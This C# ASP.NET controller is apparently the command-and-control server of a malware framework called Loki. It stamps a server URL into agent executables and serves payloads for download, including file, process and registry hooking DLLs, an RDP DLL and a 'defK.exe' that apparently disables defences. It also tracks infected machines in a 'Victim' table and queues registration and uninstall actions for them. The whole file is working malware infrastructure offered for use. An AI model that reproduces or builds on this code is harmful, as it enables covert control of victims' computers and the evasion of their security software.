using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using System;
using System.Data.SQLite;
using System.Data.Common;
using System.IO;
using Mono.Cecil;
using System.Reflection;
using Mono.Cecil.Cil;
using static System.Collections.Specialized.BitVector32;
using System.Text;
using System.Net;
using System.Net.Http;

namespace LokiServer.Controllers
{
    public class Agent
    {
        public int ID { get; set; }
        public string User { get; set; }
        public string IP { get; set; }
        public int Online { get; set; }
    }
    public class CreateRequest
    {
        public string serverURL { get; set; }
    };

    public class AddRequest
    {
        public string username { get; set; }
    };

    public class OnlineRequest
    {
        public int id { get; set; }
        public int actualOnline { get; set; }
    };

    public class DeleteRequest
    {
        public int id { get; set; }
    };

    public class UninstallRequest
    {
        public int id { get; set; }
    };

    
    [ApiController]
    [Route("[controller]")]
    public class AgentController : ControllerBase
    {

        [HttpPost]
        [Route("Create")]
        public IActionResult Create(CreateRequest request)
        {
            // if dont exist create a folder in the current directory named "Agents"
            if (!Directory.Exists("Agents"))
            {
                Directory.CreateDirectory("Agents");
            }
            // copy inside the folder the LokiAgent.exe file that is in the current directory if its not already there
            string exePath = "Agents/LokiAgent.exe";
            if (!System.IO.File.Exists(exePath))
            {
                System.IO.File.Copy("LokiAgent.exe", exePath);
            }
            int lenght = request.serverURL.Length;
            // create a new folder inside agents with the name of the request.serverUrl if dont exist
            // quit the http:// or https:// from the serverURL, but only one or the other, not both
            string withoutProtocol = request.serverURL;
            if (request.serverURL.Contains("http://"))
            {
                withoutProtocol = request.serverURL.Replace("http://", "");
            }
            else if (request.serverURL.Contains("https://"))
            {
                withoutProtocol = request.serverURL.Replace("https://", "");
            }
            // if have : replace it with _
            withoutProtocol = withoutProtocol.Replace(":", "_");
            if (!Directory.Exists("Agents/" + withoutProtocol))
            {
                Directory.CreateDirectory("Agents/" + withoutProtocol);
            }
            // copy the LokiAgent.exe file to the new folder with the name of the LokiAgent + lenght + .exe if its not already there
            string newExePath = "Agents/" + withoutProtocol + "/LokiAgent" + lenght + ".exe";
            if (!System.IO.File.Exists(newExePath))
            {
                System.IO.File.Copy(exePath, newExePath);
            }
            // and copy other time with the LokiAgent.exe name
            string newExePath2 = "Agents/" + withoutProtocol + "/LokiAgent.exe";
            if (!System.IO.File.Exists(newExePath2))
            {
                System.IO.File.Copy(exePath, newExePath2);
            }
            int position = addStringToExe(request.serverURL, newExePath);
            int position2 = addStringToExe(request.serverURL, newExePath2);
            return Ok();
        }

        [HttpGet]
        [Route("NewAgent")]
        public IActionResult NewAgent()
        {
            var filePath = "Loki.exe"; 
            if (!System.IO.File.Exists(filePath))
            {
                return NotFound("El archivo no se encontró.");
            }
            // store full path of the file
            var fileBytes = System.IO.File.ReadAllBytes(filePath);

            var contentDisposition = new System.Net.Mime.ContentDisposition
            {
                FileName = "Loki.exe", 
                Inline = false
            };
            Response.Headers.Add("Content-Disposition", contentDisposition.ToString());
            return File(fileBytes, "application/octet-stream");
        }

        [HttpGet]
        [Route("dllF")]
        public IActionResult dllF()
        {
            var filePath = "fileHooks.dll"; 
            if (!System.IO.File.Exists(filePath))
            {
                return NotFound("El archivo no se encontró.");
            }
            // store full path of the file
            var fileBytes = System.IO.File.ReadAllBytes(filePath);

            var contentDisposition = new System.Net.Mime.ContentDisposition
            {
                FileName = "fileHooks.dll", 
                Inline = false
            };
            Response.Headers.Add("Content-Disposition", contentDisposition.ToString());
            return File(fileBytes, "application/octet-stream");
        }

        [HttpGet]
        [Route("dllP")]
        public IActionResult dllP()
        {
            var filePath = "processHooks.dll"; 
            if (!System.IO.File.Exists(filePath))
            {
                return NotFound("El archivo no se encontró.");
            }
            // store full path of the file
            var fileBytes = System.IO.File.ReadAllBytes(filePath);

            var contentDisposition = new System.Net.Mime.ContentDisposition
            {
                FileName = "processHooks.dll", 
                Inline = false
            };
            Response.Headers.Add("Content-Disposition", contentDisposition.ToString());
            return File(fileBytes, "application/octet-stream");
        }


        [HttpGet]
        [Route("SystemR")]
        public IActionResult SystemR()
        {
            var filePath = "SystemR.exe"; 
            if (!System.IO.File.Exists(filePath))
            {
                return NotFound("El archivo no se encontró.");
            }
            // store full path of the file
            var fileBytes = System.IO.File.ReadAllBytes(filePath);

            var contentDisposition = new System.Net.Mime.ContentDisposition
            {
                FileName = "SystemR.exe", 
                Inline = false
            };
            Response.Headers.Add("Content-Disposition", contentDisposition.ToString());
            return File(fileBytes, "application/octet-stream");
        }

        [HttpGet]
        [Route("dllR")]
        public IActionResult dllR()
        {
            var filePath = "registryHooks.dll"; 
            if (!System.IO.File.Exists(filePath))
            {
                return NotFound("El archivo no se encontró.");
            }
            // store full path of the file
            var fileBytes = System.IO.File.ReadAllBytes(filePath);

            var contentDisposition = new System.Net.Mime.ContentDisposition
            {
                FileName = "registryHooks.dll", 
                Inline = false
            };
            Response.Headers.Add("Content-Disposition", contentDisposition.ToString());
            return File(fileBytes, "application/octet-stream");
        }

        [HttpGet]
        [Route("defK")]
        public IActionResult defK()
        {
            var filePath = "defK.exe"; 
            if (!System.IO.File.Exists(filePath))
            {
                return NotFound("El archivo no se encontró.");
            }
            // store full path of the file
            var fileBytes = System.IO.File.ReadAllBytes(filePath);

            var contentDisposition = new System.Net.Mime.ContentDisposition
            {
                FileName = "defK.exe", 
                Inline = false
            };
            Response.Headers.Add("Content-Disposition", contentDisposition.ToString());
            return File(fileBytes, "application/octet-stream");
        }

        [HttpGet]
        [Route("dllRDP")]
        public IActionResult dllRDP()
        {
            var filePath = "rdpc.dll"; 
            if (!System.IO.File.Exists(filePath))   
            {
                return NotFound("El archivo no se encontró.");
            }
            // store full path of the file
            var fileBytes = System.IO.File.ReadAllBytes(filePath);

            var contentDisposition = new System.Net.Mime.ContentDisposition
            {
                FileName = "rdpc.dll", 
                Inline = false
            };
            Response.Headers.Add("Content-Disposition", contentDisposition.ToString());
            return File(fileBytes, "application/octet-stream");
        }



        [HttpPost]
        [Route("Online")]
        public void Online(OnlineRequest request)
        {
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            if(request.actualOnline == 0)
            {
                string query = "UPDATE Victim SET Online = 0 WHERE ID = @ID";
                using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
                {
                    cmd.Parameters.AddWithValue("@ID", request.id);
                    cmd.ExecuteNonQuery();
                }
            }
            else
            {
                string query = "UPDATE Victim SET Online = 1 WHERE ID = @ID";
                using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
                {
                    cmd.Parameters.AddWithValue("@ID", request.id);
                    cmd.ExecuteNonQuery();
                }
            }
            
        }

        [HttpGet]
        [Route("Agents")]
        public Agent[] Agents()
        {
            List<Agent> agentList = new List<Agent>();
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "SELECT ID, User, IP, Online FROM Victim";
            SQLiteCommand cmd = new SQLiteCommand(query, conn);
            SQLiteDataReader reader = cmd.ExecuteReader();
            while (reader.Read())
            {
                Agent agent = new Agent();
                agent.ID = reader.GetInt32(0);
                agent.User = reader.GetString(1);
                agent.IP = reader.GetString(2);
                agent.Online = reader.GetInt32(3);
                agentList.Add(agent);
            }
            return agentList.ToArray();
        }

        [HttpPost]
        [Route("Delete")]
        public void Delete(DeleteRequest request)
        {
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "DELETE FROM Victim WHERE ID = @ID";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@ID", request.id);
                cmd.ExecuteNonQuery();
            }
        }

        [HttpPost]
        [Route("Add")]
        public string Add(AddRequest request)
        {
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Victim (User, IP, Online) VALUES (@Username, @IP, 1)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@Username", request.username);
                cmd.Parameters.AddWithValue("@IP", HttpContext.Connection.RemoteIpAddress.ToString());
                cmd.ExecuteNonQuery();
                // get the id of the last inserted row
                query = "SELECT last_insert_rowid()";
                using (SQLiteCommand cmd2 = new SQLiteCommand(query, conn))
                {
                    using (SQLiteDataReader reader = cmd2.ExecuteReader())
                    {
                        if (reader.Read())
                        {
                            addAction(reader[0].ToString());
                            return reader[0].ToString();
                        }
                    }
                }
            }
            return "";
        }

        private void addAction(string id)
        {
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date) VALUES (@VictimID, 666, @DateNow)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.ExecuteNonQuery();
            }
        }

        [HttpPost]
        [Route("Uninstall")]
        public void Uninstall(UninstallRequest request)
        {
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date) VALUES (@VictimID, 999, @DateNow)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.ExecuteNonQuery();
            }
        }

        private int addStringToExe(string serverURL, string exePath)
        {
            byte[] bytesToAdd = Encoding.UTF8.GetBytes(serverURL);

            using (FileStream fs = new FileStream(exePath, FileMode.Append, FileAccess.Write))
            {
                long position = fs.Seek(0, SeekOrigin.End); 

                fs.Write(bytesToAdd, 0, bytesToAdd.Length);

                return (int)position;
            }   
        }



      
    }


};